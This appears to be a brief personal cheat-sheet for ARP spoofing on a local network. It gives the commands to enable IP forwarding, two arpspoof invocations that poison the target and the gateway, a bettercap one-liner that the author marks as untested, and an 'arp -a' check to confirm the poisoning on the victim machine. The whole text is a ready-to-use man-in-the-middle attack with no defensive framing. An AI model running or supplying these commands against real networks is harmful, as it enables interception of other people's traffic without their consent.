# arp spoofing
```
#ip_forwarding must be enabled
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <interface> -t <gateway-ip> <target-ip>
arpspoof -i <interface> -t <target-ip> <gateway-ip>

#other methode, not tested, allows to enter the routers ip to capture all traffic:
sudo bettercap -eval "set arp.spoof.targets 192.168.1.20; arp.spoof on"
```


# Verify on target machine
```
arp -a # works on windows and linux idk about mac
```
